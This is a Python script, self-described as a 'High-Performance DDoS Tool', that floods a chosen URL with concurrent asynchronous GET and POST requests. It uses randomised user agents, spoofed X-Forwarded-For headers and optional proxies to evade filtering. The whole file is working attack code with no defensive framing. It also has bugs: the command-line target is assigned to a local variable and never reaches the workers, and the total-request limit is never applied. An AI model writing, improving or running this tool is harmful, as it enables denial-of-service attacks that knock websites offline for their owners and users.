import asyncio
import aiohttp
import random
import signal
from fake_useragent import UserAgent
import sys
import argparse

# Configuration
TARGET_URL = "http://example.com"  # Replace with target URL
REQUESTS_PER_SECOND = 100000  # Target RPS (adjust based on system capabilities)
TOTAL_REQUESTS = 1000000  # Total requests to send (0 = infinite)
PROXIES = []  # Add proxies if available (format: 'http://ip:port')
THREADS = 200  # Number of concurrent workers

ua = UserAgent(fallback="Mozilla/5.0")
STOP_FLAG = False

def signal_handler(sig, frame):
    global STOP_FLAG
    print("\n[!] Attack stopped by user.")
    STOP_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def generate_random_headers():
    headers = {
        "User-Agent": ua.random,
        "Accept": random.choice(["*/*", "text/html", "application/xhtml+xml"]),
        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "gzip, deflate",
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }
    return headers

def generate_random_payload():
    payload = {"data": "X" * random.randint(100, 1000)}
    return payload

async def worker(session, sem):
    global STOP_FLAG
    while not STOP_FLAG:
        async with sem:
            try:
                proxy = random.choice(PROXIES) if PROXIES else None
                method = random.choice(["GET", "POST"])
                headers = generate_random_headers()
                params = {"random": random.randint(1, 1000000)} if method == "GET" else None
                data = generate_random_payload() if method == "POST" else None
                
                if proxy:
                    async with session.request(method, TARGET_URL, headers=headers, params=params, data=data, proxy=proxy, timeout=5) as resp:
                        if resp.status == 503:
                            print(f"[!] Server unavailable (503) - Status: {resp.status}")
                        elif resp.status >= 400:
                            print(f"[!] Error {resp.status} - {method} {TARGET_URL}")
                        else:
                            print(f"[+] Success {resp.status} - {method} {TARGET_URL}")
                else:
                    async with session.request(method, TARGET_URL, headers=headers, params=params, data=data, timeout=5) as resp:
                        if resp.status == 503:
                            print(f"[!] Server unavailable (503) - Status: {resp.status}")
                        elif resp.status >= 400:
                            print(f"[!] Error {resp.status} - {method} {TARGET_URL}")
                        else:
                            print(f"[+] Success {resp.status} - {method} {TARGET_URL}")
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                if "Connection reset by peer" in str(e):
                    print(f"[!] Connection reset - {method} {TARGET_URL}")
                else:
                    print(f"[!] Error: {e}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")

async def main():
    global STOP_FLAG
    parser = argparse.ArgumentParser(description="High-Performance DDoS Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--rps", type=int, default=REQUESTS_PER_SECOND, help="Requests per second")
    parser.add_argument("--total", type=int, default=TOTAL_REQUESTS, help="Total requests (0=infinite)")
    parser.add_argument("--threads", type=int, default=THREADS, help="Number of workers")
    args = parser.parse_args()
    
    TARGET_URL = args.url
    REQUESTS_PER_SECOND = args.rps
    TOTAL_REQUESTS = args.total
    THREADS = args.threads
    
    print(f"[+] Starting DDoS attack on {TARGET_URL}")
    print(f"[+] Target RPS: {REQUESTS_PER_SECOND} | Total Requests: {TOTAL_REQUESTS if TOTAL_REQUESTS > 0 else 'infinite'}")
    
    connector = aiohttp.TCPConnector(limit_per_host=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=5)
    
    sem = asyncio.Semaphore(REQUESTS_PER_SECOND // 10)  # Control connection rate
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [worker(session, sem) for _ in range(THREADS)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
    
